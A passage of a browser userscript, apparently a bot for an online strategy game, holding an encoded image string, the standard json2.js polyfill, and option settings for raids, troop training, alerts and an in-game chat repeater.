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%3D%3D";

var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON;

//logit ("+++ STARTUP: "+ document.URL);

var Options = {
  srcSortBy    : 'level',
  srcMinLevel  : 1,
  srcMaxLevel  : 7,
  wildType     : 1,
  unownedOnly  : true,
  mistedOnly   : true,
  hostileOnly  : false,
  friendlyOnly  : false,
  alliedOnly  : false,
  unalliedOnly  : false,
  neutralOnly  : false,
  srcAll  : true,
  srcScoutAmt  : 1,
  minmight     : 1,
  srcdisttype  : 'square',
  pbWinIsOpen  : false,
  pbWinDrag    : true,
  pbWinPos     : {},
  pbTrackOpen  : true,
  pbKillFairie : false,
  pbGoldHappy  : 95,
  pbGoldEnable : false,
  pbEveryEnable: true,
  pbEveryMins  : 30,
  pbChatOnRight: true,
  pbWideMap    : false,
  pbFoodAlert  : true,
  alertConfig  : {aChat:false, aPrefix:'** Estoy siendo ATACADO! **', scouting:false, wilds:false, defend:true, minTroops:100, spamLimit:10, lastAttack:0, barbautoswitch:false, raidautoswitch: {},  },
  alertSound   : {enabled:false, soundUrl:DEFAULT_ALERT_SOUND_URL, repeat:true, playLength:20, repeatDelay:0.5, volume:100, alarmActive:false, expireTime:0},
  spamconfig   : {aspam:false, spamvert:'Join my Alliance!!', spammins:'10', atime:2 , spamstate:'a'},
  giftDomains  : {valid:false, list:{}},
  celltext     : {atext:false, provider:0, num1:"000", num2:"000", num3:"0000"},
  giftDelete   : 'e',
  currentTab   : null,
  hideOnGoto   : true,
  transportinterval : 60,
  minwagons		:100,
  lasttransport:0,
  reassigninterval: 60,
  lastreassign:0,
  HelpRequest  : true,
  DeleteRequest: false,
  MapShowExtra : false,
  RaidRunning  : false,
  RaidReset    : 0,
  DeleteMsg	   : false,
  DeleteMsgs0   : false,
  DeleteMsgs1   : false,
  DeleteMsgW			: false,
  Foodstatus   : {1:0,2:0,3:0,4:0,5:0,6:0,7:0},
  Creststatus  : {1101:0,1102:0,1103:0,1104:0,1105:0,1106:0,1107:0,1108:0,1109:0,1110:0,1111:0,1112:0,1113:0,1114:0,1115:0},
  LastReport   : 0,
  LastCrestReport   : 0,
  MsgInterval  : 1,
  CrestMsgInterval  : 1,
  foodreport   : false,
  crestreport  : true,
  Crest1Count  : 0,
  Crest2Count  : 0,
  CrestLevel   : 0,
  CrestType    : 0,
  };
//unsafeWindow.pt_Options=Options;

var GlobalOptions = {
  pbWatchdog   : false,
  pbWideScreen : true,
  pbWideScreenStyle : 'normal',
  autoPublishGamePopups : true,
  autoPublishPrivacySetting : 40,
  };

var CrestOptions = {
  Running   : false,
  CrestCity : 0,
  RoundOne  : true,
  RoundTwo  : true,
  lastRoundTwo : 0,
  X:0,
  Y:0,
  R1MM:0,
  R1Ball:0,
  R1Cat:0,
  R2MM:0,
  R2Pike:0,
  R2Sword:0,
  R2Arch:0,
  R2Ball:0,
  R2Ram:0,
  R2Cat:0,
  DeleteMsgswild:false
};

var TrainOptions = {
  Running   : false,
  Troops: 		{1:0,2:0,3:0,4:0,5:0,6:0,7:0},
  Threshold: 		{1:500,2:500,3:500,4:500,5:500,6:500,7:500},
  Max: 		{1:0,2:0,3:0,4:0,5:0,6:0,7:0},
  Workers: 		{1:0,2:0,3:0,4:0,5:0,6:0,7:0},
